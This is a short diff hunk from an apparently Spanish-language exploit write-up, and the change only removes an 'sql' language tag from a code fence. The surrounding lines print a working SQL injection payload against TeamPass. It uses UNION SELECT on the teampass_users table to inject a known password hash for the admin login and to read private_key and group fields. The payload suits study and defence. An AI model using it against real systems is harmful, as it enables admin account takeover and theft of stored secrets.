@@ -118,7 +118,7 @@ done
 
 como tal la SQLI que emplea es la siguiente 
 
-```sql
+```
 "none' UNION SELECT id, '$2y$10$u5S27wYJCVbaPTRiHRsx7.iImx/WxRA8/tKvWdaWQ/iDuKlIkMbhq', (url), private_key, personal_folder, fonction_id, groupes_visibles, groupes_interdits, 'foo' FROM teampass_users WHERE login='admin"
 ```
 
